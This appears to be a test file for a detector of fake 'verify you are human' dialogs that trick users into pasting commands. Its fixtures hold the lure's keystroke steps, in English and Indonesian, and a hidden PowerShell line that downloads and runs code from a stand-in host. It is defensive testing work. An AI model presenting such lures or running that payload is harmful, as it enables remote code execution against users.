// Engine 0.3.0 (ruleset m5, D-083): own-voice verification gate and procedural dialogs, with their benign counterexamples.
import { describe, expect, it } from 'vitest';
import { analyze } from '../src/core/index.js';
import { inContainer, snapshot } from './fixtures/build.js';

const DIALOG = { dialog: true };
const rules = (s: ReturnType<typeof snapshot>) => analyze(s).findings.map((f) => `${f.ruleId}:${f.classification}`);

describe('own-voice verification gate (m5)', () => {
  it('a verification dialog whose steps are framed as reported speech is lowered by at most one tier', () => {
    const s = snapshot([{ t: 'Verify you are human', c: 'g', ctx: DIALOG }, { t: 'Visitors were asked to complete these steps:', c: 'g', ctx: DIALOG },
      { t: 'Press Win + R', c: 'g', ctx: DIALOG }, { t: 'Press Ctrl + V', c: 'g', ctx: DIALOG }, { t: 'Press Enter', c: 'g', ctx: DIALOG }]);
    const r = analyze(s);
    expect(r.verdict).toBe('suspicious_correlation');
    expect(r.findings[0]!.overrides?.[0]).toMatchObject({ id: 'O.VERIFICATION_GATE', effect: 'capped-at-1' });
    expect(analyze(s, { ruleset: 'm4.1' }).verdict).toBe('observed_instruction');
  });

  it('a quiz or tutorial dialog that only QUOTES the verification lure is not a gate', () => {
    const quiz = snapshot([{ t: 'Question 3 of 10', c: 'q', ctx: DIALOG }, { t: 'Is this message legitimate?', c: 'q', ctx: DIALOG },
      { t: 'Verify you are human: press Win+R, then Ctrl+V and press Enter.', c: 'q', ctx: { dialog: true, quote: true } }]);
    expect(['none', 'observed_instruction']).toContain(analyze(quiz).verdict);
  });
});

describe('procedural dialogs (m5)', () => {
  it('a documentation install dialog with the command visible in a code block is observed, not suspicious', () => {
    const s = snapshot([{ t: 'Install ForgeKit', c: 'd', ctx: DIALOG }, { t: 'Open Terminal, paste the command below and press Enter.', c: 'd', ctx: DIALOG },
      { t: 'curl -fsSL https://get.forgekit.test/install.sh | sh', c: 'd', ctx: { dialog: true, pre: true, code: true } },
      { t: 'Seeing "permission denied"? To fix this, run the same command with sudo.', c: 'd', ctx: DIALOG }]);
    expect(rules(s)).toEqual(['R4:observed_instruction']);
  });

  it('the same dialog with a hidden clipboard payload stays suspicious', () => {
    const s = snapshot([{ t: 'Open Terminal, paste the command below and press Enter.', c: 'd', ctx: DIALOG },
      { t: 'curl -fsSL https://get.forgekit.test/install.sh | sh', c: 'd', ctx: { dialog: true, pre: true, code: true } },
      { t: 'Error? To fix this, run the command again.', c: 'd', ctx: DIALOG }],
    { hidden: [{ text: 'powershell -w hidden -c "iex(irm https://x.example.invalid/p)"', containerId: 'd', afterBlockId: 'b1' }] });
    expect(analyze(s).verdict).not.toBe('observed_instruction');
  });
});

describe('informal Indonesian key separators', () => {
  it('"Windows sama R" and "Ctrl sama V" are key combinations', () => {
    expect(analyze(snapshot(inContainer('g', ['Buktikan kamu bukan robot dulu ya', 'Pencet Windows sama R', 'Terus Ctrl sama V', 'Abis itu pencet Enter'], DIALOG))).verdict)
      .toBe('manipulative_instruction');
  });
});
